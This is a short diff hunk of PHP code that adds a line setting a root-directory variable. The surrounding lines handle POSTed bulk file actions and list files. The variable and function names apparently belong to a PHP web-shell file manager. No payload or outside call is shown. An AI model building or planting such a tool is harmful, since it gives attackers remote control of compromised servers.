@@ -106,3 +106,4 @@ switch($eanver){
 	if(!empty($_POST['actall'])){echo '<div class="actall">'.File_Act($_POST['files'],$_POST['actall'],$_POST['inver'],$REAL_DIR).'</div>';}
 	$NUM_D = $NUM_F = 0;
 	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
+	$ROOT_DIR = File_Mode();
